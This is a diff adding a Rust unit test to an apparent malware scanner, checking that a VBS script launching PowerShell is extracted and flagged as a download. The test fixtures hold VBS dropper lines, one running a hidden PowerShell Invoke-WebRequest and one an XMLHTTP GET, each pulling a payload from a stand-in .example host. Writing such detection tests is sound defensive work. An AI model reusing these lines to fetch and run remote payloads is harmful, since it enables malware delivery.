@@ -20402,6 +20402,32 @@ End With"#;
     }
 
     #[test]
+    fn standalone_vbs_powershell_run_is_extracted_and_scanned_as_ps() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "powershell -Command Invoke-WebRequest -Uri https://vbs-powershell-run.example/payload.ps1", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-powershell-run.example/payload.ps1")),
+            "VBS PowerShell run was not extracted as PS: {:?}",
+            env.all_extracted_ps1
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-powershell-run.example/payload.ps1"
+            )),
+            "VBS PowerShell run was not scanned as PS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
         let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
         let report = analyze(vbs, &Config::default());
